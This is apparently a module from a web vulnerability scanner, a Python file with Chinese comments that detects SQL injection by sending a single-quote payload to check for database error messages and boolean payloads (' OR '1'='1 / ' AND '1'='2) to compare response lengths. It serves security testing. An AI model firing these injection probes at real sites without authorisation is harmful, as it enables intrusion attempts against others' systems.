# -*- coding: utf-8 -*-
"""SQL 注入检测：错误回显 + 布尔盲注"""
import requests
from urllib.parse import quote_plus

# 数据库报错时常见的错误关键字
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "mysql_fetch",
    "warning: mysql",
    "mysql server",
    "syntax error",
    "unclosed quotation mark",
]


def _inject(url, payload):
    """把 payload 追加到 URL 参数值后面（自动 URL 编码）"""
    return url + quote_plus(payload)


def sqli_check(url):
    """返回结构化结果（dict）"""
    result = {
        "module": "sqli",
        "target": url,
        "vulnerable": False,
        "technique": None,
        "payload": None,
        "evidence": None,
    }

    # 1) 基线请求
    try:
        base = requests.get(url, timeout=5)
    except requests.RequestException as e:
        result["error"] = str(e)
        return result
    result["baseline"] = {"status": base.status_code, "length": len(base.content)}

    # 2) 错误回显测试
    inj = _inject(url, "'")
    try:
        r = requests.get(inj, timeout=5)
    except requests.RequestException:
        r = None
    if r is not None:
        body = r.text.lower()
        for marker in SQL_ERRORS:
            if marker in body:
                result["vulnerable"] = True
                result["technique"] = "错误回显"
                result["payload"] = "'"
                result["evidence"] = marker
                result["test_url"] = inj
                return result

    # 3) 布尔盲注测试
    true_url = _inject(url, "' OR '1'='1")
    false_url = _inject(url, "' AND '1'='2")
    try:
        r_true = requests.get(true_url, timeout=5)
        r_false = requests.get(false_url, timeout=5)
    except requests.RequestException:
        result["error"] = "布尔测试请求失败"
        return result

    diff = abs(len(r_true.content) - len(r_false.content))
    result["boolean"] = {
        "true_len": len(r_true.content),
        "false_len": len(r_false.content),
        "diff": diff,
    }
    if diff > 50:
        result["vulnerable"] = True
        result["technique"] = "布尔盲注"
        result["payload"] = "' OR '1'='1"
    return result
